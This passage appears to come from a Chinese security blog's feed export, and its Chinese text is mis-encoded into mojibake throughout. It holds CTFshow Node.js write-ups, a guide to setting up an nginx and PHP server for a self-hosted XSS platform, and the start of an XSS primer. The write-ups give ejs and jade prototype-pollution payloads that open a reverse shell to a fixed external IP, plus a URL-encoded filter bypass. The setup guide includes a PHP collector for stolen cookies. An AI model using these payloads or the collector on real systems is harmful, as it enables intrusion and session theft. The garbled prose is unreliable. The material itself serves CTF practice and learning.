punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web341-ejsÊ®°ÊùøÊ∏≤Êüì"><a href="#web341-ejsÊ®°ÊùøÊ∏≤Êüì" class="headerlink" title="web341(ejsÊ®°ÊùøÊ∏≤Êüì)"></a>web341(ejsÊ®°ÊùøÊ∏≤Êüì)</h4><p>ËøôÊ¨°‰æùÊóßÊòØ‰∏§Â±ÇuserÔºå‰ΩÜÊòØÊ≤°api.js‰∫Ü</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_llama1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"');var _llama2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: ‰ªéÂéüÂûãÈìæÊ±°ÊüìÂà∞RCE</a></p><p><a href="https://xz.aliyun.com/t/6113?time__1311=n4+xnD0DgDcDRlWDkDlhAe0=t+3q0odwrmxTD">XNUCA2019 HardjsÈ¢òËß£ ‰ªéÂéüÂûãÈìæÊ±°ÊüìÂà∞RCE</a></p><p>ËøôÊ¨°flagÂú®Ê†πÁõÆÂΩï</p><h4 id="web342-343-jabeÊ®°ÊùøÊ∏≤Êüì"><a href="#web342-343-jabeÊ®°ÊùøÊ∏≤Êüì" class="headerlink" title="web342-343(jabeÊ®°ÊùøÊ∏≤Êüì)"></a>web342-343(jabeÊ®°ÊùøÊ∏≤Êüì)</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span><span class="token property">"nodes"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://xz.aliyun.com/t/7025?time__1311=n4+xnD0Dy7itGQ=47KDsA3rZY=aL274AKfQx">ÂÜçÊé¢ JavaScript ÂéüÂûãÈìæÊ±°ÊüìÂà∞ RCE</a></p><p><a href="https://www.anquanke.com/post/id/236354">ÂÖ≥‰∫énodejsÁöÑejsÂíåjadeÊ®°ÊùøÂºïÊìéÁöÑÂéüÂûãÈìæÊ±°ÊüìÊåñÊéò</a></p><h4 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ËøáÊª§‰∫ÜÈÄóÂè∑ÂíåÈÄóÂè∑ÁöÑurlÁºñÁ†Å2CÔºåÊàë‰ª¨Áî®‚Äú&amp;‚ÄùËøûÊé•‰∏â‰∏™Â±ûÊÄßÔºåNodeJS‰ºöËá™Âä®ÊãºÊé•</p><pre class="language-json" data-language="json"><code class="language-json">?query=<span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"admin"</span>&amp;query=<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ctfshow"</span>&amp;query=<span class="token property">"isVIP"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span></code></pre><p>‰∏çËøáËøòÈúÄË¶ÅÂØπÂ±ûÊÄßËøõË°åurlÁºñÁ†ÅÔºåpayloadÔºö</p><pre class="language-json" data-language="json"><code class="language-json">?query=%7b%<span class="token number">22</span>%6e%<span class="token number">61</span>%6d%<span class="token number">65</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">61</span>%<span class="token number">64</span>%6d%<span class="token number">69</span>%6e%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">70</span>%<span class="token number">61</span>%<span class="token number">73</span>%<span class="token number">73</span>%<span class="token number">77</span>%6f%<span class="token number">72</span>%<span class="token number">64</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">63</span>%<span class="token number">74</span>%<span class="token number">66</span>%<span class="token number">73</span>%<span class="token number">68</span>%6f%<span class="token number">77</span>%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">69</span>%<span class="token number">73</span>%<span class="token number">56</span>%<span class="token number">49</span>%<span class="token number">50</span>%<span class="token number">22</span>%3a%<span class="token number">74</span>%<span class="token number">72</span>%<span class="token number">75</span>%<span class="token number">65</span>%7d</code></pre><p>Âõ†‰∏∫Âú®get‰πãÂâçÂèåÂºïÂè∑‰ºöË¢´urlÁºñÁ†Å‰∏∫%22Ôºå‰∏é‚Äúctfshow‚ÄùÁªÑÊàê‚Äú2c‚ÄùÔºåÁ¨¶ÂêàÊ≠£Âàô„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04‰∏änginx+phpÁéØÂ¢ÉÊê≠Âª∫</title>
      <link href="/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="ÂÜôÂú®ÂâçÈù¢"><a href="#ÂÜôÂú®ÂâçÈù¢" class="headerlink" title="ÂÜôÂú®ÂâçÈù¢"></a>ÂÜôÂú®ÂâçÈù¢</h4><p>Âú®Â≠¶‰π†XSSÊºèÊ¥ûËøáÁ®ã‰∏≠ÔºåÁî±‰∫éÁõÆÂâçÂ§ßÂ§öÊï∞XSSÂπ≥Âè∞ÈÉΩÂèòÊàê‰∫ÜÊî∂Ë¥πÁöÑÔºåÊâÄ‰ª•ÊâìÁÆóËá™Â∑±Áî®ÊúçÂä°Âô®Êê≠Âª∫Êù•ÂÆåÊàêXSSÈ¢òÁõÆ</p><p>‰∏≠ÈÄîÈÅáÂà∞‰∏çÂ∞ëÈóÆÈ¢òÔºåËøôÈáåÂàÜ‰∫´‰∏Ä‰∏ãÁªèÈ™å</p><p>ÂÆûÈ™åÁéØÂ¢É</p><p>Êìç‰ΩúÁ≥ªÁªüÔºöUbuntu 18.04 64‰Ωç</p><p>nginxÔºö1.14.0</p><p>phpÔºö7.2.17-0</p><p>php-framÔºöphp7.2-fpm</p><h4 id="ÂÆûÈ™åÊ≠•È™§"><a href="#ÂÆûÈ™åÊ≠•È™§" class="headerlink" title="ÂÆûÈ™åÊ≠•È™§"></a>ÂÆûÈ™åÊ≠•È™§</h4><h5 id="ÂÆâË£ÖÂøÖË¶ÅÁ®ãÂ∫èÂíå‰æùËµñ"><a href="#ÂÆâË£ÖÂøÖË¶ÅÁ®ãÂ∫èÂíå‰æùËµñ" class="headerlink" title="ÂÆâË£ÖÂøÖË¶ÅÁ®ãÂ∫èÂíå‰æùËµñ"></a>ÂÆâË£ÖÂøÖË¶ÅÁ®ãÂ∫èÂíå‰æùËµñ</h5><p>#ÂÆâË£ÖÁ®ãÂ∫èÂåÖ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-fpm   <span class="token comment">#nginx‰∏éphp‰πãÈó¥ÁöÑÊ°•Ê¢Å</span><span class="token function">sudo</span> <span class="token function">apt</span> remove apache2* <span class="token comment">#Âà†Èô§Ëá™Âä®ÂÆâË£ÖÁöÑApache2ÔºåÊ≥®ÊÑèÊúÄÂêéÈù¢ÊúâÊòüÂè∑</span><span class="token function">sudo</span> <span class="token function">apt</span> autoremove <span class="token comment"># Ê∏ÖÈô§Apache2ÁöÑ‰æùËµñ</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nginx</code></pre><p>#ÂÆâË£ÖÂøÖË¶Å‰æùËµñ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-json<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-curl<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-mysql<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-cgi</code></pre><h5 id="ÊµèËßàÂô®http-xxxxxx-Ëá™Â∑±ÁöÑIP-ÔºåÂá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü"><a href="#ÊµèËßàÂô®http-xxxxxx-Ëá™Â∑±ÁöÑIP-ÔºåÂá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü" class="headerlink" title="ÊµèËßàÂô®http://xxxxxx(Ëá™Â∑±ÁöÑIP)ÔºåÂá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü"></a>ÊµèËßàÂô®<a href="http://xxxxxx(Ëá™Â∑±ÁöÑip),Âá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü/">http://xxxxxx(Ëá™Â∑±ÁöÑIP)ÔºåÂá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü</a></h5><p><img src="welcome.png" loading="lazy"></p><p>ÊúâÂèØËÉΩÊòæÁ§∫‰∏∫ÈòøÂ∏ïÂ•á‰∏ªÈ°µÔºåÂèØ‰ª•Â∞ùËØïÂà†Èô§ &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</p><p>Âõ†‰∏∫ÂÆâË£ÖphpÁöÑÊó∂ÂÄô‰ºöËá™Âä®ÂÆâË£Öapache2,ÂØºËá¥ÂæÄËøôÈáåÂÜô‰∫ÜËøô‰∏™index.htmlÈùôÊÄÅÊñá‰ª∂ÔºåÂç∏ËΩΩ‰∫ÜApache2Ôºå‰ΩÜËøô‰∏™indexÊ≤°Âà†ÊéâÔºåÂØºËá¥Âá∫Áé∞ÂºÇÂ∏∏ÔºåÈóÆÈ¢ò‰∏çÂ§ß</p><h5 id="ÈÖçÁΩÆphp-frm"><a href="#ÈÖçÁΩÆphp-frm" class="headerlink" title="ÈÖçÁΩÆphp-frm"></a>ÈÖçÁΩÆphp-frm</h5><h6 id="‰øÆÊîπfrmÈÖçÁΩÆÊñá‰ª∂"><a href="#‰øÆÊîπfrmÈÖçÁΩÆÊñá‰ª∂" class="headerlink" title="‰øÆÊîπfrmÈÖçÁΩÆÊñá‰ª∂"></a>‰øÆÊîπfrmÈÖçÁΩÆÊñá‰ª∂</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/php.ini</code></pre><p>vim‰∏çÊòØÂîØ‰∏ÄÈÄâÊã©Ôºå‰πüÂèØ‰ª•Êõ¥Êç¢Ëá™Â∑±ÁÜüÊÇâÁöÑÁºñËæëÂô®</p><p>#‰øÆÊîπÂ¶Ç‰∏ãÂèÇÊï∞</p><p><code>;cgi.fix_fathinfo=1</code>Êîπ‰∏∫<code>cgi.fix_fathinfo=0</code></p><p><img src="phpini.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/pool.d/www.conf</code></pre><p>#‰øÆÊîπÂ¶Ç‰∏ãÂèÇÊï∞</p><p>listen &#x3D; 127.0.0.1:9000 ÔºàÂéüÂÖàÂÄºÊòØ&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sockÔºâ<br>listen.allowed_clients &#x3D; 127.0.0.1<br>pm.max_children &#x3D; 50<br>pm.max_requests &#x3D; 500<br>request_terminate_timeout &#x3D; 0<br>rlimit_files &#x3D; 1024</p><h6 id="ÁºñÂÜôdemoÊµãËØï‰∏Ä‰∏ã"><a href="#ÁºñÂÜôdemoÊµãËØï‰∏Ä‰∏ã" class="headerlink" title="ÁºñÂÜôdemoÊµãËØï‰∏Ä‰∏ã"></a>ÁºñÂÜôdemoÊµãËØï‰∏Ä‰∏ã</h6><p>Âú®<code>/var/www/html/</code>‰∏ãÁºñÂÜôindex.php</p><pre class="language-markup" data-language="markup"><code class="language-markup">vim /var/www/html/index.phpÂÜÖÂÆπÂ¶Ç‰∏ãÔºö    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span> Hello,this is test page. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><h6 id="ÈÖçÁΩÆnginx"><a href="#ÈÖçÁΩÆnginx" class="headerlink" title="ÈÖçÁΩÆnginx"></a>ÈÖçÁΩÆnginx</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/nginx/sites-available/default</code></pre><p>Âú®<code>index.html</code>ÂâçÂä†‰∏ä<code>index.php</code></p><p>Â∞Ü‰ª•‰∏ãÊ°Ü‰∏≠ÂÜÖÂÆπ‰øÆÊîπ</p><pre class="language-http" data-language="http"><code class="language-http">location ~ \.php$ &#123;    root           html;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    include        fastcgi_params;&#125;</code></pre><p><img src="nginx.png" alt="img" loading="lazy"></p><h6 id="ÈáçÂêØÊúçÂä°"><a href="#ÈáçÂêØÊúçÂä°" class="headerlink" title="ÈáçÂêØÊúçÂä°"></a>ÈáçÂêØÊúçÂä°</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> php7.2-fpm restart<span class="token function">sudo</span> <span class="token function">service</span> nginx restart </code></pre><h4 id="Êü•ÁúãdemoÊµãËØï"><a href="#Êü•ÁúãdemoÊµãËØï" class="headerlink" title="Êü•ÁúãdemoÊµãËØï"></a>Êü•ÁúãdemoÊµãËØï</h4><p>ÊµèËßàÂô®ËÆøÈóÆËá™Â∑±ÁöÑIP</p><p><img src="Demo.png" loading="lazy"></p><p>Ëá≥Ê≠§Â∞±ÂèØ‰ª•ËøõË°åÁºñÂÜôËá™Â∑±ÁöÑÁΩëÁ´ô‰∫ÜÔºåÂõ†‰∏∫ÊàëÊòØÁî®‰ΩúXSSÂπ≥Âè∞Áî®ÔºåÊâÄ‰ª•ÁÆÄÂçïÂàÜ‰∫´‰∏Ä‰∏ãÊàëÁöÑÈóÆÈ¢ò</p><h4 id="ÈÅáÂà∞ÁöÑÈóÆÈ¢ò"><a href="#ÈÅáÂà∞ÁöÑÈóÆÈ¢ò" class="headerlink" title="ÈÅáÂà∞ÁöÑÈóÆÈ¢ò"></a>ÈÅáÂà∞ÁöÑÈóÆÈ¢ò</h4><h5 id="ÁΩëÈ°µÊó†Ê≥ïËÆøÈóÆ"><a href="#ÁΩëÈ°µÊó†Ê≥ïËÆøÈóÆ" class="headerlink" title="ÁΩëÈ°µÊó†Ê≥ïËÆøÈóÆ"></a>ÁΩëÈ°µÊó†Ê≥ïËÆøÈóÆ</h5><p>ÊàëÂú®<code>/var/www/html/</code>‰∏ãÂàõÂª∫‰∫Ü<code>xss</code>ÁöÑÁõÆÂΩïÔºå‰∏ãÈù¢Êîæ‰∫ÜÂèØ‰ª•ÂèçÂºπÂà∞cookieÁöÑphp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ÂàöÂºÄÂßã‰∏ÄÁõ¥ËÆøÈóÆ‰∏ç‰∫Ü Êä•ÈîôÔºö<code>Not input file specified</code>ÁÑ∂ÂêéÁúãÊó•Âøó<code>/var/log/nginx/error.log</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">FastCGI sent <span class="token keyword">in</span> stderr: <span class="token string">"Unable to open primary script: /var/www/html//xss/cookie.php (No such file or directory)"</span></code></pre><p>ÁúãÂà∞Êñá‰ª∂Ë∑ØÂæÑÂ§ö‰∫Ü‰∏Ä‰∏™<code>/</code>‰∫éÊòØÊü•ËØ¢ÔºåÂú®ÈÖçÁΩÆnginxÁöÑÊó∂ÂÄôÂá∫‰∫ÜÁÇπÂ∞èÈóÆÈ¢ò<code>fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</code>ÊîπÊàêËøôÊ†∑Âà†ÂéªÂ§ö‰ΩôÁöÑ<code>/</code></p><h5 id="Êó†Ê≥ïÂÜôÂÖ•Êñá‰ª∂"><a href="#Êó†Ê≥ïÂÜôÂÖ•Êñá‰ª∂" class="headerlink" title="Êó†Ê≥ïÂÜôÂÖ•Êñá‰ª∂"></a>Êó†Ê≥ïÂÜôÂÖ•Êñá‰ª∂</h5><p>Âõ†‰∏∫Ëøô‰∏™phpÊòØË¶ÅÊääÂèçÂºπËøáÊù•ÁöÑcookieÂÜôÂÖ•txtÁöÑÔºåÊâÄ‰ª•ÊàëËøô‰∏™ËôΩÁÑ∂ÂèØ‰ª•ÊàêÂäüÊâìÂºÄÔºå‰ΩÜÊòØ‰∏ÄÁõ¥ÂÜôÂÖ•‰∏ç‰∫ÜÔºå‰∫éÊòØÊõ¥ÊîπÁõÆÂΩï<code>xss</code>ÁöÑÊùÉÈôê‰∏∫664ÔºåÊîπÂÆå‰πãÂêéÊòØÊúâÂÜôÂÖ•ÊùÉÈôê‰∫ÜÔºå‰ΩÜÊòØÁΩëÈ°µÂèàÊâì‰∏çÂºÄ‰∫ÜÔºåÁÑ∂ÂêéÂèëÁé∞Ôºå‰Ωú‰∏∫ÁõÆÂΩï‰∏ç‰ªÖÈúÄË¶ÅÂÜôÂÖ•ÊùÉÈôê‰πüÈúÄË¶ÅÂèØÊâßË°åÊùÉÈôêÔºå‰∫éÊòØÊîπÊàê777ÔºåÂ∑≤ÁªèÂÖ®ÈÉ®Ëß£ÂÜ≥„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ÊäÄÊúØÁ¨îËÆ∞ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁéØÂ¢ÉÊê≠Âª∫ </tag>
            
            <tag> nginx+php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-xss</title>
      <link href="/2024/07/24/web%E5%85%A5%E9%97%A8-xss/"/>
      <url>/2024/07/24/web%E5%85%A5%E9%97%A8-xss/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><h4 id="XSSÂéüÁêÜ"><a href="#XSSÂéüÁêÜ" class="headerlink" title="XSSÂéüÁêÜ"></a>XSSÂéüÁêÜ</h4><p>Ë∑®Á´ôËÑöÊú¨ÊîªÂáªÔºàXSSÔºâÔºåÊòØÊúÄÊôÆÈÅçÁöÑWebÂ∫îÁî®ÂÆâÂÖ®ÊºèÊ¥û„ÄÇËøôÁ±ªÊºèÊ¥ûËÉΩÂ§ü‰ΩøÂæóÊîªÂáªËÄÖÂµåÂÖ•ÊÅ∂ÊÑèËÑöÊú¨‰ª£Á†ÅÂà∞Ê≠£Â∏∏Áî®Êà∑‰ºöËÆøÈóÆÂà∞ÁöÑÈ°µÈù¢‰∏≠ÔºåÂΩìÊ≠£Â∏∏Áî®Êà∑ËÆøÈóÆËØ•È°µÈù¢Êó∂ÔºåÂàôÂèØÂØºËá¥ÂµåÂÖ•ÁöÑÊÅ∂ÊÑèËÑöÊú¨‰ª£Á†ÅÁöÑÊâßË°åÔºå‰ªéËÄåËææÂà∞ÊÅ∂ÊÑèÊîªÂáªÁî®Êà∑ÁöÑÁõÆÁöÑ„ÄÇ</p><p>HTMLÊòØ‰∏ÄÁßçË∂ÖÊñáÊú¨Ê†áËÆ∞ËØ≠Ë®ÄÔºåÈÄöËøáÂ∞Ü‰∏Ä‰∫õÂ≠óÁ¨¶ÁâπÊÆäÂú∞ÂØπÂæÖÊù•Âå∫Âà´ÊñáÊú¨ÂíåÊ†áËÆ∞Ôºå‰æãÂ¶ÇÔºåÂ∞è‰∫éÁ¨¶Âè∑Ôºà&lt;ÔºâË¢´Áúã‰ΩúÊòØHTMLÊ†áÁ≠æÁöÑÂºÄÂßãÔºå‰πãÈó¥ÁöÑÂ≠óÁ¨¶ÊòØÈ°µÈù¢ÁöÑÊ†áÈ¢òÁ≠âÁ≠â„ÄÇÂΩìÂä®ÊÄÅÈ°µÈù¢‰∏≠ÊèíÂÖ•ÁöÑÂÜÖÂÆπÂê´ÊúâËøô‰∫õÁâπÊÆäÂ≠óÁ¨¶ÔºàÂ¶Ç&lt;ÔºâÊó∂ÔºåÁî®Êà∑ÊµèËßàÂô®‰ºöÂ∞ÜÂÖ∂ËØØËÆ§‰∏∫ÊòØÊèíÂÖ•‰∫ÜHTMLÊ†áÁ≠æÔºåÂΩìËøô‰∫õHTMLÊ†áÁ≠æÂºïÂÖ•‰∫Ü‰∏ÄÊÆµJavaScriptËÑöÊú¨Êó∂ÔºåËøô‰∫õËÑöÊú¨Á®ãÂ∫èÂ∞±Â∞Ü‰ºöÂú®Áî®Êà∑ÊµèËßàÂô®‰∏≠ÊâßË°å„ÄÇÊâÄ‰ª•ÔºåÂΩìËøô‰∫õÁâπÊÆäÂ≠óÁ¨¶‰∏çËÉΩË¢´Âä®ÊÄÅÈ°µÈù¢Ê£ÄÊü•ÊàñÊ£ÄÊü•Âá∫Áé∞Â§±ËØØÊó∂ÔºåÂ∞±Â∞Ü‰ºö‰∫ßÁîüXSSÊºèÊ¥û„ÄÇ</p><p>‰øóÁß∞ÁöÑËßÅÊ°ÜÂ∞±Êèí„ÄÇ‰∏™‰∫∫ÁêÜËß£ÔºåÁî±‰∫éHTMLÁöÑÊ†áÁ≠æÁâπÊÄßÔºåÂèØ‰ª•ÈÄöËøáÁΩëÈ°µÁöÑËæìÂÖ•Ê°ÜËæìÂÖ•ËÑöÊú¨‰ª£Á†ÅÔºå‰ΩøÁΩëÈ°µÊâßË°åÊÅ∂ÊÑèËÑöÊú¨ÔºåËææÂà∞ÊîªÂáªÁöÑÁõÆÁöÑ„ÄÇ</p><h4 id="XSSÁ±ªÂûã‰ªãÁªç"><a href="#XSSÁ±ªÂûã‰ªãÁªç" class="headerlink" title="XSSÁ±ªÂûã‰ªãÁªç"></a>XSSÁ±ªÂûã‰ªãÁªç</h4><h5 id="ÂèçÂ∞ÑÂûã"><a href="#ÂèçÂ∞ÑÂûã" class="headerlink" title="ÂèçÂ∞ÑÂûã"></a><strong>ÂèçÂ∞ÑÂûã</strong></h5><p>ÂèçÂ∞ÑÂûãË∑®Á´ôËÑöÊú¨ÔºàReflected Cross-Site ScriptingÔºâÊòØÊúÄÂ∏∏ËßÅÔºå‰πüÊòØ‰ΩøÁî®ÊúÄÂπøÁöÑ‰∏ÄÁßçÔºåÂèØÂ∞ÜÊÅ∂ÊÑèËÑöÊú¨ÈôÑÂä†Âà∞ URL Âú∞ÂùÄÁöÑÂèÇÊï∞‰∏≠</p><p>ÂèçÂ∞ÑÂûã XSS ÁöÑÂà©Áî®‰∏ÄËà¨ÊòØÊîªÂáªËÄÖÈÄöËøáÁâπÂÆöÊâãÊ≥ïÔºàÂ¶ÇÁîµÂ≠êÈÇÆ‰ª∂ÔºâÔºåËØ±‰ΩøÁî®Êà∑ÂéªËÆøÈóÆ‰∏Ä‰∏™ÂåÖÂê´ÊÅ∂ÊÑè‰ª£Á†ÅÁöÑ URLÔºåÂΩìÂèóÂÆ≥ËÄÖÁÇπÂáªËøô‰∫õ‰∏ìÈó®ËÆæËÆ°ÁöÑÈìæÊé•ÁöÑÊó∂ÂÄôÔºåÊÅ∂ÊÑè‰ª£Á†Å‰ºöÁõ¥Êé•Âú®ÂèóÂÆ≥ËÄÖ‰∏ªÊú∫‰∏äÁöÑÊµèËßàÂô®ÊâßË°å„ÄÇÊ≠§Á±ª XSS ÈÄöÂ∏∏Âá∫Áé∞Âú®ÁΩëÁ´ôÁöÑÊêúÁ¥¢Ê†è„ÄÅÁî®Êà∑ÁôªÂΩïÂè£Á≠âÂú∞ÊñπÔºåÂ∏∏Áî®Êù•Á™ÉÂèñÂÆ¢Êà∑Á´Ø Cookies ÊàñËøõË°åÈíìÈ±ºÊ¨∫È™ó„ÄÇ</p><h5 id="Â≠òÂÇ®Âûã"><a href="#Â≠òÂÇ®Âûã" class="headerlink" 